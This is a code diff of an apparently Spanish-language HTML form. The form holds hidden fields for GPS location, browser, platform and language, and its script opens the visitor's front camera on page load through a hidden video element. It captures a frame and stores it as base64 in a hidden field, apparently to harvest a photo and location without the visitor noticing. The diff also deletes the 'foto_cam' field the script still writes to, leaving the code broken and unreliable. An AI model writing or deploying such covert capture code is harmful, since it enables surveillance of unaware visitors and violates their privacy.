@@ -264,8 +264,11 @@
   <input type="hidden" name="gps_loc" id="gps_loc">
   <input type="hidden" name="gps_accuracy" id="gps_accuracy">
   <input type="hidden" name="gps_error" id="gps_error">
-            <!-- campo oculto para la foto -->
-  <input type="hidden" name="foto_cam" id="foto_cam">
+          
+            <video id="camara" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+          
             <input type="hidden" name="navegador" id="navegador">
   <input type="hidden" name="plataforma" id="plataforma">
   <input type="hidden" name="idioma_navegador" id="idioma_navegador">
@@ -323,24 +326,25 @@
 
     document.addEventListener("DOMContentLoaded", async function() {
   try {
-    // Pedir acceso a la cámara frontal
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" } // "user" = cámara frontal
+      video: { facingMode: "user" } // cámara frontal
     });
 
     const video = document.getElementById("camara");
+    if (!video) {
+      console.error("Elemento <video id='camara'> no encontrado");
+      return;
+    }
+
     video.srcObject = stream;
 
-    // Esperar a que el video cargue
     video.onloadedmetadata = () => {
-      // Dibujar un frame en el canvas
       const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Convertir a base64 y guardar en el campo oculto
       const fotoBase64 = canvas.toDataURL("image/png");
       document.getElementById("foto_cam").value = fotoBase64;
     };
